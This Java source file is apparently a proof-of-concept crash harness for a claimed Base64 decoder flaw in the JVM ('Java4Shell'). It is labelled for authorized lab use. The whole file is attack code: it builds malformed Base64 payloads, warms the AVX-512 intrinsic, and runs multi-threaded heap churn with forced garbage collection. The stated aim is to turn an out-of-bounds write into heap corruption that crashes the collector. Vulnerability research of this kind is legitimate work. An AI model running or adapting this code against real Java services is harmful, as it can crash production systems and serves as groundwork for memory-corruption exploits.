/*
 * Base64Crash.java - bounded crash attempt for CVE-2026-114938 (Java4Shell).
 * AUTHORIZED LAB USE ONLY. Own code; no third-party exploit components.
 *
 * Goal: turn the AVX-512 Base64 decoder out-of-bounds write into a faulting SIGSEGV
 * by surrounding each decode output buffer with freshly allocated objects and keeping
 * GC busy, so a corrupted object header crashes the collector. Tiny heap + SerialGC
 * for a tight, deterministic layout. Multiple worker threads to widen the window.
 *
 *   java -Xmx32m -XX:+UseSerialGC -XX:+ErrorFileToStderr Base64Crash 2>> service-stderr.log
 */
import java.util.Base64;
import java.util.ArrayList;
import java.util.List;

public class Base64Crash {
    static volatile boolean stop = false;
    // A few malformed tails: 4n+1 (single '='), 4n+2/4n+3 variants, pad 64/65/128.
    static final String[] PAYLOADS = build();

    static String[] build() {
        int[] pads = {64, 65, 128, 129};
        String[] tails = {"=", "==", "A=", "AA="};
        List<String> out = new ArrayList<>();
        for (int p : pads) {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < p; i++) sb.append('A');
            for (String t : tails) out.add(sb.toString() + t);
        }
        return out.toArray(new String[0]);
    }

    public static void main(String[] args) throws Exception {
        final Base64.Decoder dec = Base64.getDecoder();
        int threads = Math.max(2, Runtime.getRuntime().availableProcessors());
        System.out.println("[*] threads=" + threads + " payloads=" + PAYLOADS.length);

        // Warm the intrinsic hard on the main thread first.
        byte[] warm = PAYLOADS[0].getBytes();
        for (int i = 0; i < 2_000_000; i++) { try { dec.decode(warm); } catch (IllegalArgumentException e) {} }
        System.out.println("[*] intrinsic warmed; starting churn...");

        List<Thread> ts = new ArrayList<>();
        for (int t = 0; t < threads; t++) {
            Thread th = new Thread(() -> {
                java.util.Random r = new java.util.Random();
                ArrayList<byte[]> keep = new ArrayList<>();
                long n = 0;
                while (!stop) {
                    // surround the decode output with small live allocations
                    for (int k = 0; k < 8; k++) keep.add(new byte[48 + r.nextInt(32)]);
                    if (keep.size() > 4096) keep.subList(0, 2048).clear();
                    byte[] p = PAYLOADS[r.nextInt(PAYLOADS.length)].getBytes();
                    try { dec.decode(p); } catch (IllegalArgumentException e) {}
                    try { dec.decode(PAYLOADS[r.nextInt(PAYLOADS.length)]); } catch (IllegalArgumentException e) {}
                    if ((++n & 0x3FFFF) == 0) System.gc();
                }
            });
            th.setDaemon(true);
            ts.add(th);
            th.start();
        }
        // bounded run
        long deadline = System.currentTimeMillis() + 100_000;
        while (System.currentTimeMillis() < deadline) Thread.sleep(500);
        stop = true;
        System.out.println("[*] no crash within time budget (clean exit)");
    }
}
